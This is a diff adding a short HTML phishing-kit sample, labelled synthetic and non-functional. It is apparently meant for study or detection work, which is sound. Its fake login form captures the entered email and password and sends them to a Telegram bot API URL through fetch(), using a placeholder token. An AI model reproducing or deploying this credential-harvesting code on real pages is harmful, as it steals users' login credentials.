@@ -1,0 +1,13 @@
+<!-- Synthetic sample - phishing kit with Telegram exfil (NON-FUNCTIONAL, fake token) -->
+<form id="login" onsubmit="grab(event)">
+  <input name="email"><input type="password" name="password">
+</form>
+<script>
+function grab(e){
+  e.preventDefault();
+  var email=document.querySelector('[name=email]').value;
+  var password=document.querySelector('[name=password]').value;
+  fetch("https://api.telegram.org/bot1234567890:AAFAKEtokenNOTreal_0000000000000/sendMessage"
+    +"?chat_id=999999&text=login%20"+email+"%20pass%20"+password);
+}
+</script>
